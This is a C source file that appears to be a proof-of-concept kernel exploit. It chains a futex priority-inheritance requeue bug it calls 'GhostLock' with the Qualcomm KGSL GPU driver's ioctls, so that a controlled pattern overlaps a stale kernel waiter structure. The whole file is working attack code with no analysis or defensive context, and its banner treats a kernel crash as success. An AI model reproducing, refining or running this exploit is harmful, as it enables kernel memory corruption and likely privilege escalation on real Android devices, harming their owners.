/**
 * ghostlock64_opt.c — 64-bit GhostLock + KGSL: MINIMAL stack between trigger and CFU
 *
 * Strategy: Pre-create KGSL fd and context BEFORE GhostLock.
 * After GhostLock, immediately fire RB_ISSUEIBCMDS without any
 * intermediate syscalls that might overwrite the stale waiter.
 *
 * ⚠️ KERNEL CRASH = CFU OVERLAP!
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;
static int g_fd = -1;
static uint32_t g_ctx_id;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
    (void)a;

    /* Pre-create KGSL resources BEFORE GhostLock */
    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0) { printf("open failed\n"); return 0; }

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    int r = ioctl(g_fd, 0xc0080913, &ctx);
    if (r < 0) { printf("create failed\n"); close(g_fd); return 0; }
    g_ctx_id = ctx.id;
    printf("[pre] kgsl fd=%d ctx=%u\n", g_fd, g_ctx_id);

    /* Now GhostLock setup */
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] GhostLock returned: ret=%d errno=%d\n", r, errno);

    /* ── IMMEDIATELY fire CFU with crash pattern ── */
    /* No open(), no create() — use pre-created resources! */
    struct { uint64_t ga; uint64_t sw; } __attribute__((aligned(8))) ib;
    ib.ga = 0x0ULL;
    ib.sw = 0x4141414141414141ULL;  /* CRASH if overlaps waiter->task */

    printf("[kgsl] ⚠️  FIRING CFU with crash pattern!\n");
    printf("[kgsl]   ibdesc: ga=0x%016llx sw=0x%016llx\n",
           (unsigned long long)ib.ga, (unsigned long long)ib.sw);

    /* Compat cmd 0xc0140910 */
    struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
        cmd = {g_ctx_id, 0, (uint32_t)(uintptr_t)&ib, 0, 1};

    errno = 0;
    r = ioctl(g_fd, 0xc0140910, &cmd);
    printf("[kgsl] ISSUEIBCMDS: ret=%d errno=%d %s\n",
           r, errno, r==0?"⚠️ CFU FIRED! Kernel should crash now!":strerror(errno));

    ioctl(g_fd, 0x40040914, &g_ctx_id);
    close(g_fd);

    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  64-bit GhostLock+KGSL (OPTIMIZED)  ║\n");
    printf("║  Pre-create kgsl, minimal post-GL   ║\n");
    printf("║  ⚠️  KERNEL CRASH = SUCCESS!       ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
    return 0;
}
